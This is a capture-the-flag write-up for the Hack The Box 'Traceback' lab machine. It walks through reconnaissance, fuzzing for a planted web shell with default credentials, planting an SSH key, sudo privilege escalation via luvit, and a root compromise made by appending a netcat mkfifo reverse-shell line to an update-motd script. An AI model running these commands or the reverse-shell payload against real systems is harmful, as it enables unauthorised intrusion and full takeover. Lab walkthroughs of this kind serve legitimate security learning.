# Traceback-HTB
Traceback is a Linux machine that rated as easy and it contain some OSINT. So let's start :)

# Recon
I started by runing nmap scan on the machine and found 2 open ports.
```
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV 10.10.10.181
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-20 22:17 EDT
Nmap scan report for 10.10.10.181
Host is up (0.026s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)
|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA)
|_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Help us
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.47 seconds
```
By visiting the Web Server you will not find something useful, but if you looked at the suorce page you will find this:
```html
<center>
		<h1>This site has been owned</h1>
		<h2>I have left a backdoor for all the net. FREE INTERNETZZZ</h2>
		<h3> - Xh4H - </h3>
		<!--Some of the best web shells that you might need ;)-->
	</center>
```
So the author who made the Machine actually made a list of Web Shells that you can find here: https://github.com/Xh4H/Web-Shells

Then I coppied the list there and use it for fuzzing.
```
┌──(kali㉿kali)-[~/Desktop/HTB/TracBack]
└─$ cat Web-shell.txt 
alfa3.php
alfav3.0.1.php
andela.php
bloodsecv4.php
by.php
c99ud.php
cmd.php
configkillerionkros.php
jspshell.jsp
mini.php
obfuscated-punknopass.php
punk-nopass.php
punkholic.php
r57.php
smevk.php
wso2.8.5.php
```

## ffuf
As always the BEST tool for fuzing web directories is ffuf :)
```
┌──(kali㉿kali)-[~/Desktop/HTB/TracBack]
└─$ ./ffuf -w Web-shell.txt -u http://10.10.10.181/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.181/FUZZ
 :: Wordlist         : FUZZ: Web-shell.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

smevk.php               [Status: 200, Size: 1261, Words: 318, Lines: 59]
:: Progress: [16/16] :: Job [1/1] :: 4 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```
![image1](https://github.com/electronicbots/HackTheBox/blob/master/Machines/Traceback/images/1.png)

So we found the Web shell, but it require a username and a password. If you look look at ```smevk.php``` file you will find the username and the password ```admin:admin```

![image2](https://github.com/electronicbots/HackTheBox/blob/master/Machines/Traceback/images/2.png)

## User Flag

I prefer to work with a shell rathar than a Web Shell. So I added my public SSH key to the current user's.

![image3](https://github.com/electronicbots/HackTheBox/blob/master/Machines/Traceback/images/3.png)

And If we try to ssh now, we are in :)
```
┌──(kali㉿kali)-[~/Desktop/HTB/TracBack]
└─$ ssh webadmin@10.10.10.181
The authenticity of host '10.10.10.181 (10.10.10.181)' can't be established.
ECDSA key fingerprint is SHA256:7PFVHQKwaybxzyT2EcuSpJvyQcAASWY9E/TlxoqxInU.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.181' (ECDSA) to the list of known hosts.
#################################
-------- OWNED BY XH4H  ---------
- I guess stuff could have been configured better ^^ -
#################################

Welcome to Xh4H land 



Last login: Thu Feb 27 06:29:02 2020 from 10.10.14.3
webadmin@traceback:~$
```
So first thing we have is some notes:
```
webadmin@traceback:~$ cat note.txt 
- sysadmin -
I have left a tool to practice Lua.
I'm sure you know where to find it.
Contact me if you have any question.
```

If we try ```sudo -l```
```
webadmin@traceback:~$ sudo -l
Matching Defaults entries for webadmin on traceback:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User webadmin may run the following commands on traceback:
    (sysadmin) NOPASSWD: /home/sysadmin/luvit
```

So we know that we can run ```luvit``` as ```systemamin```. So let's spwan a shell:
```
webadmin@traceback:~$ sudo -u sysadmin /home/sysadmin/luvit -e 'os.execute("/bin/bash")'
sysadmin@traceback:~$ id
uid=1001(sysadmin) gid=1001(sysadmin) groups=1001(sysadmin)
```
Now we can get user flag:
```
sysadmin@traceback:/home/sysadmin$ cat user.txt 
a2a51fc3...caa3047eef4
```

## Root Flag

So if we check the running process we can find this:
```root       1531  0.0  0.0   4628   832 ?        Ss   19:57   0:00 /bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/ ```

if we check ```/etc/update-motd.d/ ```. We have write access on ```00-header``` so we can run commands as root. so let's get a reverse shell from it.

Start a listener: ``` nc -nlvp 4444 ```

Add the following line into 00-header ```rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.28 4444 >/tmp/f ```
```sysadmin@traceback:~$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.28 4444 >/tmp/f" >> /etc/update-motd.d/00-header ```

Now ssh and you will get your reverse shell
```
┌──(kali㉿kali)-[~]
└─$ ssh webadmin@10.10.10.181                                                                                                                                                                                                        130 ⨯
#################################
-------- OWNED BY XH4H  ---------
- I guess stuff could have been configured better ^^ -
#################################
```
Now you should get your reverse shell as root :)

```
kali@kali:~$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.28] from (UNKNOWN) [10.10.10.181] 34606
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
```
```
# cat root.txt
ba379ba...effa42c
```

Thanks for reading and you can find me here on Twitter: https://twitter.com/electronicbots
